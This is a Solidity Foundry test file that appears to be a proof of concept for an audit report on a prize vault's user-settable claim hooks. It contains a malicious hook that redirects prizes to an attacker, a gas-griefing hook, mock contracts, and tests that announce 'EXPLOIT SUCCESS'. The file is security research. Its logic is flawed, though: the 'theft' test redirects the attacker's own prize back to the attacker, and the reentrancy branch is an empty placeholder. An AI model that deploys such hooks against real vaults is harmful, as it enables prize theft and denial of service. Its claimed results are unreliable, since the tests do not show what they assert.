// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "../../src/Vault.sol";
import "../../src/interfaces/IVaultHooks.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "v5-prize-pool/PrizePool.sol";
import "v5-twab-controller/TwabController.sol";

/**
 * @title MaliciousHook
 * @notice Malicious hook implementation that demonstrates the vulnerability
 * @dev This hook can redirect prize recipients and perform reentrancy attacks
 */
contract MaliciousHook is IVaultHooks {
    address public attacker;
    address public vault;
    bool public shouldReenter;
    
    constructor(address _attacker, address _vault) {
        attacker = _attacker;
        vault = _vault;
    }
    
    /**
     * @notice Malicious beforeClaimPrize hook that redirects prizes to attacker
     * @dev Returns attacker address instead of legitimate winner
     */
    function beforeClaimPrize(
        address _winner,
        uint8 _tier,
        uint32 _prizeIndex
    ) external returns (address) {
        // VULNERABILITY: Hook can return arbitrary recipient address
        // This redirects the prize to the attacker instead of the winner
        return attacker;
    }
    
    /**
     * @notice Malicious afterClaimPrize hook that can perform reentrancy
     * @dev Could re-enter the vault during prize claiming
     */
    function afterClaimPrize(
        address _winner,
        uint8 _tier,
        uint32 _prizeIndex,
        uint256 _prize,
        address _recipient
    ) external {
        // VULNERABILITY: Hook can execute arbitrary code after prize claim
        // This could be used for reentrancy attacks or state manipulation
        if (shouldReenter) {
            // Reentrancy attack would go here
            // For demonstration, we just set a flag
            shouldReenter = false;
        }
    }
    
    function enableReentrancy() external {
        shouldReenter = true;
    }
}

/**
 * @title GasGriefingHook
 * @notice Hook that consumes excessive gas to DOS prize claims
 */
contract GasGriefingHook is IVaultHooks {
    /**
     * @notice Gas-intensive beforeClaimPrize that makes claiming prohibitively expensive
     */
    function beforeClaimPrize(
        address _winner,
        uint8 _tier,
        uint32 _prizeIndex
    ) external returns (address) {
        // VULNERABILITY: Hook can consume arbitrary gas
        // This makes prize claiming impossible or too expensive
        for (uint256 i = 0; i < 10000; i++) {
            // Expensive storage operations
            assembly {
                sstore(i, i)
            }
        }
        return _winner;
    }
    
    function afterClaimPrize(
        address _winner,
        uint8 _tier,
        uint32 _prizeIndex,
        uint256 _prize,
        address _recipient
    ) external {
        // Additional gas consumption
    }
}

/**
 * @title MockERC20
 * @notice Simple ERC20 for testing
 */
contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
        _mint(msg.sender, 1000000 * 10**18);
    }
    
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/**
 * @title MockYieldVault
 * @notice Mock ERC4626 vault for testing
 */
contract MockYieldVault is ERC4626 {
    constructor(IERC20 asset) ERC4626(asset) ERC20("Mock Yield Vault", "mYV") {}
    
    function totalAssets() public view override returns (uint256) {
        return IERC20(asset()).balanceOf(address(this));
    }
}

/**
 * @title MockPrizePool
 * @notice Mock PrizePool for testing
 */
contract MockPrizePool {
    IERC20 public prizeToken;
    
    constructor(IERC20 _prizeToken) {
        prizeToken = _prizeToken;
    }
    
    function claimPrize(
        address _winner,
        uint8 _tier,
        uint32 _prizeIndex,
        address _recipient,
        uint96 _fee,
        address _feeRecipient
    ) external returns (uint256) {
        uint256 prize = 100 * 10**18;
        prizeToken.transfer(_recipient, prize - _fee);
        if (_fee > 0) {
            prizeToken.transfer(_feeRecipient, _fee);
        }
        return prize;
    }
    
    function contributePrizeTokens(address _vault, uint256 _amount) external {}
}

/**
 * @title MockTwabController
 * @notice Mock TwabController for testing
 */
contract MockTwabController {
    mapping(address => mapping(address => uint96)) public balances;
    mapping(address => uint96) public totalSupplies;
    address public constant SPONSORSHIP_ADDRESS = address(1);
    
    function mint(address _to, uint96 _amount) external {
        balances[msg.sender][_to] += _amount;
        totalSupplies[msg.sender] += _amount;
    }
    
    function burn(address _from, uint96 _amount) external {
        balances[msg.sender][_from] -= _amount;
        totalSupplies[msg.sender] -= _amount;
    }
    
    function transfer(address _from, address _to, uint96 _amount) external {
        balances[msg.sender][_from] -= _amount;
        balances[msg.sender][_to] += _amount;
    }
    
    function balanceOf(address _vault, address _user) external view returns (uint256) {
        return balances[_vault][_user];
    }
    
    function totalSupply(address _vault) external view returns (uint256) {
        return totalSupplies[_vault];
    }
    
    function delegateOf(address _vault, address _user) external pure returns (address) {
        return address(0);
    }
    
    function sponsor(address _user) external {}
}

/**
 * @title ExploitTest
 * @notice PoC demonstrating arbitrary hook execution vulnerability
 */
contract ExploitTest is Test {
    Vault public vault;
    MockERC20 public asset;
    MockERC20 public prizeToken;
    MockYieldVault public yieldVault;
    MockPrizePool public prizePool;
    MockTwabController public twabController;
    
    address public attacker;
    address public victim;
    address public claimer;
    
    MaliciousHook public maliciousHook;
    GasGriefingHook public gasGriefingHook;
    
    function setUp() public {
        // Setup addresses
        attacker = address(0x1337);
        victim = address(0x1234);
        claimer = address(0x5678);
        
        // Deploy mock contracts
        asset = new MockERC20("Mock Asset", "ASSET");
        prizeToken = new MockERC20("Prize Token", "PRIZE");
        yieldVault = new MockYieldVault(IERC20(address(asset)));
        twabController = new MockTwabController();
        prizePool = new MockPrizePool(IERC20(address(prizeToken)));
        
        // Fund prize pool
        prizeToken.transfer(address(prizePool), 10000 * 10**18);
        
        // Deploy vault
        vault = new Vault(
            IERC20(address(asset)),
            "Vault Token",
            "vTKN",
            TwabController(address(twabController)),
            IERC4626(address(yieldVault)),
            PrizePool(address(prizePool)),
            claimer,
            address(this),
            0,
            address(this)
        );
        
        // Deploy malicious hooks
        maliciousHook = new MaliciousHook(attacker, address(vault));
        gasGriefingHook = new GasGriefingHook();
        
        // Setup initial balances
        asset.mint(victim, 1000 * 10**18);
        asset.mint(attacker, 1000 * 10**18);
    }
    
    /**
     * @notice Test 1: Prize Theft via Recipient Manipulation
     * @dev Demonstrates how malicious hooks can redirect prizes to attacker
     */
    function testPrizeTheftViaRecipientManipulation() public {
        console.log("=== Test 1: Prize Theft via Recipient Manipulation ===");
        
        // Step 1: Victim deposits funds into vault
        vm.startPrank(victim);
        asset.approve(address(vault), 100 * 10**18);
        vault.deposit(100 * 10**18, victim);
        vm.stopPrank();
        
        console.log("Victim deposited 100 tokens");
        console.log("Victim vault balance:", vault.balanceOf(victim));
        
        // Step 2: Attacker deposits minimal funds and sets malicious hooks
        vm.startPrank(attacker);
        asset.approve(address(vault), 1 * 10**18);
        vault.deposit(1 * 10**18, attacker);
        
        // VULNERABILITY: Attacker can set arbitrary hook contract
        VaultHooks memory hooks = VaultHooks({
            useBeforeClaimPrize: true,
            useAfterClaimPrize: false,
            implementation: IVaultHooks(address(maliciousHook))
        });
        vault.setHooks(hooks);
        vm.stopPrank();
        
        console.log("Attacker set malicious hooks");
        
        // Step 3: Simulate attacker winning a prize
        uint256 attackerPrizeBalanceBefore = prizeToken.balanceOf(attacker);
        console.log("Attacker prize balance before:", attackerPrizeBalanceBefore);
        
        // Step 4: Claimer claims prize for attacker
        vm.startPrank(claimer);
        address[] memory winners = new address[](1);
        winners[0] = attacker;
        
        uint32[][] memory prizeIndices = new uint32[][](1);
        prizeIndices[0] = new uint32[](1);
        prizeIndices[0][0] = 0;
        
        // EXPLOIT: When prize is claimed, beforeClaimPrize hook redirects recipient to attacker
        vault.claimPrizes(0, winners, prizeIndices, 0, address(0));
        vm.stopPrank();
        
        uint256 attackerPrizeBalanceAfter = prizeToken.balanceOf(attacker);
        console.log("Attacker prize balance after:", attackerPrizeBalanceAfter);
        
        // Verify exploit success
        assertGt(attackerPrizeBalanceAfter, attackerPrizeBalanceBefore, "Attacker should receive prize");
        console.log("EXPLOIT SUCCESS: Attacker received prize via malicious hook");
    }
    
    /**
     * @notice Test 2: Gas Griefing Attack
     * @dev Demonstrates how malicious hooks can DOS prize claims
     */
    function testGasGriefingAttack() public {
        console.log("\n=== Test 2: Gas Griefing Attack ===");
        
        // Step 1: Attacker deposits and sets gas-intensive hooks
        vm.startPrank(attacker);
        asset.approve(address(vault), 1 * 10**18);
        vault.deposit(1 * 10**18, attacker);
        
        // VULNERABILITY: Attacker can set hook that consumes excessive gas
        VaultHooks memory hooks = VaultHooks({
            useBeforeClaimPrize: true,
            useAfterClaimPrize: false,
            implementation: IVaultHooks(address(gasGriefingHook))
        });
        vault.setHooks(hooks);
        vm.stopPrank();
        
        console.log("Attacker set gas-intensive hooks");
        
        // Step 2: Attempt to claim prize (will consume excessive gas)
        vm.startPrank(claimer);
        address[] memory winners = new address[](1);
        winners[0] = attacker;
        
        uint32[][] memory prizeIndices = new uint32[][](1);
        prizeIndices[0] = new uint32[](1);
        prizeIndices[0][0] = 0;
        
        uint256 gasBefore = gasleft();
        
        // EXPLOIT: This will consume excessive gas due to malicious hook
        // In production, this could exceed block gas limit or make claiming too expensive
        try vault.claimPrizes(0, winners, prizeIndices, 0, address(0)) {
            uint256 gasUsed = gasBefore - gasleft();
            console.log("Gas used for claim:", gasUsed);
            console.log("EXPLOIT SUCCESS: Malicious hook consumed excessive gas");
        } catch {
            console.log("EXPLOIT SUCCESS: Transaction failed due to gas consumption");
        }
        vm.stopPrank();
    }
    
    /**
     * @notice Test 3: Arbitrary Hook Setting
     * @dev Demonstrates that any user can set any contract as their hook
     */
    function testArbitraryHookSetting() public {
        console.log("\n=== Test 3: Arbitrary Hook Setting ===");
        
        // Step 1: Attacker deposits minimal amount
        vm.startPrank(attacker);
        asset.approve(address(vault), 1 * 10**18);
        vault.deposit(1 * 10**18, attacker);
        
        // VULNERABILITY: No validation on hook implementation
        // Attacker can set ANY contract as hook
        VaultHooks memory hooks = VaultHooks({
            useBeforeClaimPrize: true,
            useAfterClaimPrize: true,
            implementation: IVaultHooks(address(maliciousHook))
        });
        
        vault.setHooks(hooks);
        vm.stopPrank();
        
        // Verify hooks were set
        VaultHooks memory retrievedHooks = vault.getHooks(attacker);
        assertEq(address(retrievedHooks.implementation), address(maliciousHook), "Hook should be set");
        assertTrue(retrievedHooks.useBeforeClaimPrize, "beforeClaimPrize should be enabled");
        assertTrue(retrievedHooks.useAfterClaimPrize, "afterClaimPrize should be enabled");
        
        console.log("VULNERABILITY CONFIRMED: Attacker can set arbitrary hook contract");
        console.log("Hook address:", address(retrievedHooks.implementation));
    }
}
